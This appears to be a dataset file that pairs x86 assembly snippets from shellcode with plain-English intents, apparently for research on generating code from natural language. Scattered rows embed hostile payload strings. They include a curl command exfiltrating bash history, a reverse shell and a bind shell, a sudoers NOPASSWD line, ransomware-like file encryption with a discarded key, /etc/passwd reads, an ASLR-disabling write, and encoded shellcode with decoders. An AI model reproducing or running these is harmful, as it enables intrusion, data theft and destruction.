SNIPPETS	INTENTS
add eax, 10	add 10 to the contents of eax
add eax, 16	add 16 to eax
add eax, 2	add 2 to the contents of the eax register
add eax, 2	add 2 to the eax register
add eax, 2	add decimal 2 to eax register
add eax, 24	add 24 to eax
add eax, 3 \n jnz L3	add 3 to ecx and jump to L3 if the sum is not zero
add eax, 4	add 4 to eax
add eax, 4 \n jnz decode	add 4 to eax and jump to decode if the result is not zero
add eax, 40000h	add 40000h to eax register
add eax, 48	add decimal 48 to eax
add eax, 48	add 48 to eax
add eax, 9 \n jnz decode	add the value 9 to eax and jump to decode if the result is not zero
add eax, c	add c to eax
add eax, ebx	add the contents of ebx to the contents of eax
add eax, ebx	add the value on ebx to eax
add eax, ebx	add ebx to eax
add eax, ebx	add ebx to eax and store the result in eax
add eax, edx	add edx to eax
add eax, edx	add the contents of edx to the contents of eax
add eax, edx	add the contents of the edx register to the contents of eax register
add eax, esi	add the contents of esi to the contents of eax
add eax, esi	add the contents of the esi register to the contents of eax register
add eax,0xe458376a	add hexadecimal value 0xe458376a to eax register
add ebp, 0x2	add 0x2 to the contents of ebp
add ebp, 0x2	add 0x2 to ebp
add ebx, 0x2	save sys_connect = 3 into ebx register
add ebx, 0x2	add 0x2 to the contents in ebx and save the result in ebx
add ebx, 16	add 16 to ebx
add ebx, 2	add decimal integer 2 to ebx
add ebx, 2	add 2 to the contents of the ebx register
add ebx, 24	add 48 to ebx
add ebx, 3	add the value 3 to the content of ebx register
add ebx, 3	add 3 to the contents of the ebx register
add ebx, 5	add decimal integer 5 to ebx
add ebx, ecx	add ecx to ebx
add ebx,2	add 2 to ebx content
add ecx, 1	add the value 1 into the ecx register
add ecx, 16	add 16 to ecx
add ecx, ebx	add ebx to ecx
add edi, 2	add 2 to edi
add edi, 37	add 37 to edi contents
add edi, edi	add the contents of edi to the contents of edi
add edi, edi	add the contents of the edi register to the contents of edi register
add edi,0x11111111	add hexadecimal value 0x11111111 to edi content
add edx, 16	set edx to next 16 byte block
add edx, 32	add 32 to edx
add edx, 48	add 48 to edx
add edx, 64	add the value 64 to the content of edx register
add edx, 64	add 64 to the contents of the edx register
add edx, eax	add the contents of eax to the contents of edx
add edx, eax	add the contents of the eax register to the contents of edx register
add edx, eax	add the contents of the eax register to the edx register
add edx, ecx	add ecx to edx
add edx,ebx	add ebx content to edx
add esi, 0x21354523	add 0x21354523 to the contents in esi and save the result in esi
add esi, 0x21354523	add 0x21354523 to the contents of esi
add esi, 0x30	add hexadecimal value 0x30 to esi content
add esi, 0x30	add 0x30 to esi
add esi, 0x33333333	add the hexadecimal value 0x33333333 at esi content
add esi, 0x33333333	add 0x33333333 value to esi
add esi, 0x3f3f3f3f	add 0x3f3f3f3f to the contents in esi and save the result in esi
add esi, 0x8	add 0x8 to esi
add esi, 0x8	"make esi point to next 8bytes of ""shellcode"""
add esi, 2	add 2 to the contents of esi
add esi, 4	add 4 to the contents of the esi register
add esi, 4	add 4 to esi
add esi, eax	set the mem addr dinamically
add esi, eax	add the contents of the eax register to the contents of esi register
add esi, eax	add eax to esi
add esi,4	scan the next section of mem
add esp, 0x20	add 0x20 to the contents in esp and save the result in esp
add esp, 3	add 3 to the contents of esp
add esp, 3	add 3 to the contents of the esp register
add esp, 4	add 4 to the esp register
add marks, 10	add 10 to the variable marks
addr: db 0x1	define addr = db 0x1
addr: db 0x1	define the byte addr and initialize it to 0x1
all:	define _all label
all:	define the all label
an_integer dd 12425	define the doubleword an_integer and initialize it to 12425
and al, 0fh	perform a logical and operation between the al register and the 0fh value and store the result in the al register
and ax, 1	perform logical and between ax and 1
and eax, 0000000fh	mask out lowest 4 bits of the eax register
and eax, 0fh	clear all but the last 4 bits of eax
and eax, 3f465456	perform and operation between eax and 3f465456 and save the result in eax
and eax, 40392b29	perform and operation between eax and 40392b29 and save the result in eax
and ebx, 0000000fh	mask out lowest 4 bits of the ebx register
and ecx, 0000000fh	mask out lowest 4 bits of the ecx register
and ecx,dword ptr [eax-0x7]	anding the double word at the adress eax-0x7 and ecx register
and ecx,dword ptr [ebx+0x1a]	anding the double word at the adress ebx+0x1a and ecx register
and edx, 0000000fh	mask out lowest 4 bits of the edx register
and mask1, 128	perform and operation on the variable mask1 and 128
arr dd 100	define the doubleword arr and initialize it to 100
arr dd 50	define the doubleword arr and initialize it to 50
arr1 resb 400	reserve the array arr1 of 400 uninitialized bytes
array dd 20	define the doubleword arr and initialize it to 20
array word 20	define an array of 20 initialized word
array word 5	define an array of 5 initialized word
aslr_file:	define _aslr_file label
b: dd 0x0	create variable b in memory and initialize to zero
big_number dd 123456789	define the doubleword variable big_number and initialize it to 123456789
bignum: resw 1	reserve 1 word at location bignum
bound ebp,qword ptr [ecx+0x6e]	perform a bound check to array index
bound ebp,qword ptr [edx-0x55915597]	perform a bound check to array index
bound esp,qword ptr [ebx+0x41]	perform a bound check to array index
buffer: resb 64	reserve 64 bytes for buffer
buffersize: dw 1024	declare buffersize to be a word containing 1024
byte_table db 14, 15, 22, 45	define a tables of bytes byte_table and initialize to 14, 15 and 22
byte_value db 150	define the byte value byte_value and initialize it to 150
bytes db 10	define the byte value bytes and initialize it to 10
bytes db 20	define the byte value bytes and initialize it to 20
call _appendfile	call the _appendfile function
"call _appendfile \n msg2 db ""passwd"", 0x00"	jump to _appendfile label after putting the address of the next istruction on the top pf the stack
call _build	call the _build function
"call _build \n msg db ""curl http://localhost:8080 -d 'data='$(cat .bash_history | base64 -w 0) -x post"", 0x0a"	push the address of msg on the top of the stack, and then change the eip to the address in _build label
call _continue	call _continue
call _continue	call the _continue function
call _exec	jump to _exec label
call _exec	call the _exec function
"call _exec \n msg db ""mv test.txt .test.txt && head -c 32 /dev/urandom | base64 | openssl aes-256-cbc -e -in .test.txt -out test.txt -pbkdf2 -k - && rm .test.txt"", 0x0a"	push the address of message on the top of the stack, and then change the eip to the address in _exec label
call _exit	call _exit
call _malloc	call _malloc
call _myfunc	call the _myfunc function
call _params	call the _params function
"call _params \n string db ""test.txt"""	push the address of test.txt on the top of the stack, and then change the eip to the address in _params label
call _printf	call the _printf function
call _write	call the _write function
"call _write \n google: db ""127.1.1.1 google.com"""	go to _write label after entering google address on the top of the sack
call [esp]	push the current code location on stack and the perform an unconditional jumo to the code location indicated by esp content
call [esp]	execute decoded_shellcode
call [esp]	call the function in esp
call atoi	call the atoi function
call code	call the code function
"call code \n file: db ""/sbin/iptables#-f"""	"push the address of file: db ""/sbin/iptables#-f"" on the top of the stack, and then change the eip to the address in code_label"
call cont	call the cont function
call cont \n db '0',10	go to _cont after entering db '0',10 adress on the top of the stack
call decoder	jump to _decoder label
call decoder	go to _decoder label
call decoder	go to deocder label
call decoder	jump to decoder_label
call decoder	call the function decoder
call decoder	call the decoder function
call decoder	call decoder
call decoder \n encoded_shellcode: dw 0x545, 0x4a3, 0x583, 0x5d3, 0x541, 0x541, 0x439, 0x5d3, 0x5d3, 0x541, 0x5e7, 0x5d5, 0x5cf, 0x411, 0x4eb, 0x443, 0x509, 0x48d, 0x423, 0x539	jump to _decoder label after saving encoded_shellcode ' dw 0x545, 0x4a3, 0x583, 0x5d3, 0x541, 0x541, 0x439, 0x5d3, 0x5d3, 0x541, 0x5e7, 0x5d5, 0x5cf, 0x411, 0x4eb, 0x443, 0x509, 0x48d, 0x423, 0x539' pointer to esi
call decoder \n encoded: dw 0x04, 0x539, 0x9d9, 0x6c9, 0xfc9, 0xc49, 0xc29, 0x839, 0xdf9, 0xc49, 0xc49, 0x839, 0x839, 0xce9, 0xc59, 0x259, 0x4f9, 0xfc9, 0x259, 0x4e9, 0xff9, 0x259, 0x4d9, 0x1c9, 0xa79, 0x619, 0x2c9, 0x539	jump to decoder_label after entering the double word string encoded '0x04, 0x539, 0x9d9, 0x6c9, 0xfc9, 0xc49, 0xc29, 0x839, 0xdf9, 0xc49, 0xc49, 0x839, 0x839, 0xce9, 0xc59, 0x259, 0x4f9, 0xfc9, 0x259, 0x4e9, 0xff9, 0x259, 0x4d9, 0x1c9, 0xa79, 0x619, 0x2c9, 0x539' on stack
call decoder \n encodedshellcode: db 0x32,0x51,0x30,0x74,0x69,0x63,0x6f,0xe4,0x8a,0x54,0xe2,0x0c,0x81,0xc1,0x69,0x30,0x69,0x30,0x6a,0x8a,0x51,0xe3,0x8a,0xb1,0xce	push the address of encodedshellcode on the top of the stack, and then change the eip to the address in _shellcode label
call decoder \n encodedshellcode: db 0xd6,0x47,0xb7,0x9f,0xd8,0xd8,0x94, 0x9f,0x9f,0xd8,0xa5,0x9e,0x99,0x7e,0x24,0xb7,0x7e,0x25,0xb4,0x7e,0x26,0x57,0xfc,0x3a,0x87	jump to _decoder label after entering _encodedshellcode (db db 0xd6,0x47,0xb7,0x9f,0xd8,0xd8,0x94,0x9f,0x9f,0xd8,0xa5,0x9e,0x99,0x7e,0x24,0xb7,0x7e,0x25,0xb4,0x7e,0x26,0x57,0xfc,0x3a,0x87) on the top of the stack
call decoder \n shellcode: db 0x18,0x38,0xc7,0x57,0x6f,0x36,0x36,0x7a,0x6f,0x6f,0x36,0x69,0x70,0x75,0x90,0xea,0x38,0xd0,0x90,0xd1,0x71,0x12,0x5f,0xd4,0x87	go to _decoder label after entering the address of the array shellcode (0x18,0x38,0xc7,0x57,0x6f,0x36,0x36,0x7a,0x6f,0x6f,0x36,0x69,0x70,0x75,0x90,0xea,0x38,0xd0,0x90,0xd1,0x71,0x12,0x5f,0xd4,0x87) on the top of the stack
call decoder \n shellcode: db 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b,0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d	go to _decoder label after entering shellcode (db 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b,0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d) address on the top of the stack
call decoder \n shellcode: db 0x4b,0xf7,0x13,0x59,0xcc,0x8c,0x63,0x5e,0x9f,0x8d,0x99,0x9f,0x1f,0xa4,0x3b,0x6e,0xc6,0x36,0x23 \n shellcodelen equ $-shellcode	shellcode address will be pushed into the stack
call decoder \n shellcode: db 0x62,0x60,0xa0,0x34,0x5e,0x97,0xe6,0x34,0xd0,0x97,0xc4,0xb4,0xdc,0xc4,0xc7,0x28,0x13,0x71,0xa6,0xc4,0xc3,0x58,0x16,0xe6,0x01	go to _decoder label after entering shellcode ‘0x62,0x60,0xa0,0x34,0x5e,0x97,0xe6,0x34,0xd0,0x97,0xc4,0xb4,0xdc,0xc4,0xc7,0x28,0x13,0x71,0xa6,0xc4,0xc3,0x58,0x16,0xe6,0x01’ on the top of the stack
call decoder \n xor dword ptr [edx-0x55af5540],ebp	xoring ebp content with the double word at the adress edx-0x55af5540 then go to decoder label
call decoder_setup	call decoder_setup
call decoder1 \n xor_value: db 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa \n rot_value: db 13, 13, 13, 13, 13, 13, 13, 13 \n shellcode: db 0x94,0x67,0xf7,0xdf,0x96,0x96,0x2a,0xdf,0xdf,0x96,0xc5,0xdc,0xd1,0x3c,0x5a,0xf7,0x3c,0x45,0xca,0x3c,0x44,0x17,0xb2,0x70,0x27	jump to decoder1_label afetr entering xor_value, rot_value and shellcode on the top pf the stack
call doit	call the doit function
call egghunter	go to egghunter
call egghunter	call the egghunter function
call esi	call esi
call esi	call the function in esi
call esp	call esp
call execute	call the execute function
"call execute \n db ""cp /bin/sh /tmp/sh”"	"put db ""cp /bin/sh /tmp/sh” address on stack then jump to _esecute label"
call internetreadfile	call function internetreadfile
call iprint	call the iprint function
call iprintlf	call the iprintlf function
call jmp_search	call jmp_search
call jmp_search	call the jmp_search function
call loader	call loader
call loader	call the loader function
call main	call the main function
call me	call the me function
call my_subroutine	call my_subroutine
call near stageaddress	call near stageaddress
call near stageaddress	call the near function
call one	call the one function
"call one \n string: db ""/etc/passwd"""	"push the address of string: db ""/etc/passwd"" on the top of the stack, and then change the eip to the address in one_label"
call open	jump to open_label
call prepare	call the prepare function
call prepare \n db ',ajm,pk#########'	go to prepere after storing string on the stack
call quit	call the quit function
call returnlabel	call returnlabel
call set_argv	call set_argv
call set_argv	call the set_argv function
"call set_argv \n cmd: db ""cat /etc/passwd;echo do__ne"""	"go to _set_argv label afeter entering the byte string cmd = cat /etc/passwd;echo do__ne on stack"
call shell_ret	call the shell_ret function
call shell_ret \n db “/bin/sh”	go to shell_ret label after ebtering byte string “/bin/sh” address on stack
call shellcode	jump to the address of shellcode_label
call shellcode	call the shellcode function
call shellcode \n db '/proc/sys/kernel/randomize_va_space'	go to _shellcode label after entering the address of the string = ‘/proc/sys/kernel/randomize_va_space' on the top of the stack
call shellcode \n db '/proc/sys/kernel/randomize_va_spacex'	go to _shellcode label after entering the byte string '/proc/sys/kernel/randomize_va_spacex' address on stack
call shellcode \n db 'my.txtx'	go to _shellcode label after entering the byte string ‘mt.txtx’ address on the top of the stack
"call shellcode \n message db ""/bin/sh"""	push the address of /bin/sh on the top of the stack, and then change the eip to the address in shellcode_label
call shellcode \n port: db 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77	go to shellcode label after entering port: db db 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77 address on stack
call shellcode db '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd'	jump to shellcode_label after entering the byte string '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd' on the top of the stack
call sprint	call the sprint function
call sprintlf	call the sprintlf function
call start	call the start function
call strlen	call the strlen function
call two	call the two function
call write	go to _write label
call write	call the write function
"call write \n db ""all all=(all) nopasswd: all"" , 0xa"	"entring db ""all all=(all) nopasswd: all"" , 0xa address on stack, then jump to _write label"
call writestring	call writestring
call writestring	call the writestring function
"call writestring \n db ""rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | /bin/nc localhost 9999 > /tmp/fr"""	"go to _writestring label after entering the byte string ""rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | /bin/nc localhost 9999 > /tmp/fr"" address on the top of the stack"
call_decoded:	define call_decoded_label
call_decoded:	define the call_decoded label
call_decoded: \n call [esp]	define call_decoded and execute it
call_decoder:	declare _call_decoder label
call_decoder:	define _call_decoder label
call_decoder:	define call_decoder label
call_decoder:	define call_decoder_label
call_decoder:	define call_decoder function
call_decoder:	define call_decoder
call_decoder:	call_decoder label
call_decoder:	define the call_decoder label
call_decoder: \n call decoder	define call_decoder and call decoder function
call_decoder: \n call decoder	define the call_decoder label and call the decoder function
call_decoder: \n call decoder	define call_decoder and call decoder
call_decoder: \n call decoder \n shellcode: db 0xeb,0x25,0x5e,0x31,0xc9,0xb1,0x1e,0x80,0x3e,0x07,0x7c,0x05,0x80,0x2e,0x07,0xeb,0x11,0x31,0xdb,0x31,0xd2,0xb3,0x07,0xb2,0xff,0x66,0x42,0x2a,0x1e,0x66,0x29,0xda,0x88,0x16,0x46,0xe2,0xe2,0xeb,0x05,0xe8,0xd6,0xff,0xff,0xff,0x38,0xc7,0x57,0x6f,0x69,0x68,0x7a,0x6f,0x6f,0x69,0x70,0x75,0x36,0x6f,0x36,0x36,0x36,0x36,0x90,0xea,0x57,0x90,0xe9,0x5a,0x90,0xe8,0xb7,0x12,0xd4,0x87	in the function call_decoder call the decoder routine and define shellcode as array of bytes 0xeb,0x25,0x5e,0x31,0xc9,0xb1,0x1e,0x80,0x3e,0x07,0x7c,0x05,0x80,0x2e,0x07,0xeb,0x11,0x31,0xdb,0x31,0xd2,0xb3,0x07,0xb2,0xff,0x66,0x42,0x2a,0x1e,0x66,0x29,0xda,0x88,0x16,0x46,0xe2,0xe2,0xeb,0x05,0xe8,0xd6,0xff,0xff,0xff,0x38,0xc7,0x57,0x6f,0x69,0x68,0x7a,0x6f,0x6f,0x69,0x70,0x75,0x36,0x6f,0x36,0x36,0x36,0x36,0x90,0xea,0x57,0x90,0xe9,0x5a,0x90,0xe8,0xb7,0x12,0xd4,0x87
call_egghunter:	define call_egghunter label
call_egghunter:	define the call_egghunter label
call_shellcode:	declare _call_shellcode label
call_shellcode:	declare call_shellcode_label
call_shellcode:	define call_shellcode_label
call_shellcode:	delcare call_shellcode_label
call_shellcode:	define call_shellcode label
call_shellcode:	define call_shellcode function
call_shellcode:	call_shellcode function
call_shellcode:	call_shellcode routine
call_shellcode:	declare the call_shellcode label
call_shellcode:	define the call_shellcode label
call_shellcode: \n call decoder	define the call_shellcode label and call the decoder function
call_shellcode: \n call decoder	define the call_shellcode function and call decoder
call_shellcode: \n call decoder	define call_shellcode and call decoder function
call_shellcode: \n call decoder	in call_shellcode call the decoder function
call_shellcode: \n call decoder	in call_shellcode execute the decoder routine
call_write:	define _call_write label
call_write:	define the call_write label
callit:	define the callit label
callme:	define the callme label
callpop:	define _ callpop label
callpop:	define the callpop function
callpop:	define the callpop label
cdq	convert the doubleword with sign (32 bit) provided in eax into the quadword with sign (64 bit) left in edx:eax
cdq	convert the doubleword with sign (32 bit) provided in eax into the quadword with sign (64 bit) left in edx:eax (clear eax and edx registers)
cdq	zero out edx using the sign bit from eax
cdq	save edx as a null byte
cdq	convert signed dword in eax to a signed quad word in edx:eax
cdq	set edx to 0
cdq	edx to 0
cdq	set edx = 0
cdq	overwriting edx with either 0
cdq	zero out edx
cdq	clear the edx register
cdq	extend the sign bit of the eax register into the edx register
cdq	extend the sign bit of eax register into the edx register
cdq	extend the sign bit of eax into the edx register
cdq \n mov ecx, edx	zero out edx and ecx regsiter
cdq \n push edx	zero out edx and push ortocol id = 0 on stack
check_even_odd:	define check_even_odd label
check_even_odd:	define check_even_odd
check_even_odd:	define check_even_odd function
child:	define the child function
child:	define the child label
chmod_call equ 15	define chmod_call =15
chmod_call equ 15	define chmod_call equal to 15
choice db 'y'	define variable choice of 1 byte and initialize to y
cld	clear the direction flag
cld	clear direction flag increasing si and di index registers.
cld	set the direction flag to zero
cld	direction flag equal to zero
cli	clear interrupt flag
close_syscall equ 6	define close_syscall=6
close_syscall equ 6	define close_syscall equal to 6
close:	define close_label
closefile:	define _closefile label
closefile:	define the closefile function
closefile:	define the closefile label
cmd:	define _cmd label
cmd:	define the cmd label
cmd: db 'cat /etc/passwd'	declare cmd string and initialize it to 'cat /etc/passwd'
cmd: db 'cat /etc/passwd'	define cmd as the byte string 'cat /etc/passwd'
cmp [ebp+arg_0], 1	compare the contents stored at ebp+arg_0 with 1
cmp [ebp+var_a], 0	compare if the contents at memory location ebp+var_a is 0
cmp [ebp+var_a], 0	compare the contents at memory location ebp+var_a with 0
cmp [ebp+var_a], 0 \n jnz short loc_4010E5	jump short to the memory location loc_4010E5 if the contents of the memory address ebp+var_a is not equal to zero
cmp [ebp+var_a], 0 \n jnz short loc_4010E5	if the contents of the memory address ebp+var_a is not equal to zero then jump short to the memory location loc_4010E5
cmp [esi], edx	compare the contents at memory location esi and the contents of the edx register
cmp [esi], edx	compare the contents at memory location esi with edx
cmp al, 0x38 \n je 0x40 \n push byte 0x1	jump to the memory address 0x40 if the contents of the al register is equal to the value 0x38 else push the byte representation of the value 0x1 onto the stack
cmp al, 0x38 \n je 0x40 \n push byte 0x1	if the contents of the al register is equal to the value 0x38 then jump to the memory address 0x40 else push the byte representation of the value 0x1 onto the stack
cmp al, 0xaa \n je decode_insertion \n xor al, bl	jump to the decode_insertion label if the contents of the al register is equal to the vale 0xaa else perform a logical xor operation between the al register and the bl register and store the result in the al register
cmp al, 0xaa \n je decode_insertion \n xor al, bl	if the contents of the al register is equal to the vale 0xaa then jump to the decode_insertion label else perform a logical xor operation between the al register and the bl register and store the result in the al register
cmp al, 0xf2	if it return efault, bad address
cmp al, 0xf2	compare if the contents of al with 0xf2
cmp al, 0xf2	compare the contents of the al register and 0xf2
cmp al, 0xf2	compare the contents of the al register with the value 0xf2
cmp al, 0xf2 \n je _start	jump to the _start label if the contents of the al register is equal to the value 0xf2
cmp al, 0xf2 \n je _start	if the contents of the al register is equal to the value 0xf2 then jump to the _start label
cmp al, 0xf2 \n je _start \n mov eax, 0x50905090	jump to the _start label if the contents of the al register is equal to the value 0xf2 else move the value 0x50905090 into the eax register
cmp al, 0xf2 \n je _start \n mov eax, 0x50905090	if the contents of the al register is equal to the value 0xf2 then jump to the _start label else move the value 0x50905090 into the eax register
cmp al, 0xf2 \n je fillOnes	jump to the fillOnes label if the contents of the al register is equal to the value 0xf2
cmp al, 0xf2 \n je fillOnes	if the contents of the al register is equal to the value 0xf2 then jump to the fillOnes label
cmp al, 0xf2 \n je fillOnes \n mov eax, 0x59935193	jump to the fillOnes label if the contents of the al register is equal to 0xf2 else move the value 0x59935193 into the eax register
cmp al, 0xf2 \n je fillOnes \n mov eax, 0x59935193	if the contents of the al register is equal to 0xf2 then jump to the fillOnes label else move the value 0x59935193 into the eax register
cmp al, 0xf2 \n je next_page	jump to the label next_page if the contents of the al register is equal to the value 0xf2
cmp al, 0xf2 \n je next_page	if the contents of the al register is equal to the value 0xf2 then jump to the label next_page
cmp al, 0xf2 \n jz _start	jump to the _start label if the contents of the al register is equal to the value 0xf2
cmp al, 0xf2 \n jz _start	if the contents of the al register is equal to the value 0xf2 then jump to the _start label
cmp al, 0xf2 \n jz incpage	if the contents of the al register is equal to the value 0xf2 then jump to the incpage label
cmp al, 0xf2 \n jz incpage	jump to the incpage label if the contents of the al register is equal to the value 0xf2
cmp al, 0xf2 \n jz next_page	verify if sys_access returned an efault, and if it matchs jump to next_page label
cmp al, 9 \n jg l1	jump to the label l1 if the contents of the al register is greater than the decimal value 9
cmp al, 9 \n jg l1	if the contents of the al register is greater than the decimal value 9 then jump to the label l1
cmp al, 9 \n jge l1	jump to the label l1 if the contents of the al register is greater than or equal to the decimal value 9
cmp al, 9 \n jge l1	if the contents of the al register is greater than or equal to the decimal value 9 then jump to the label l1
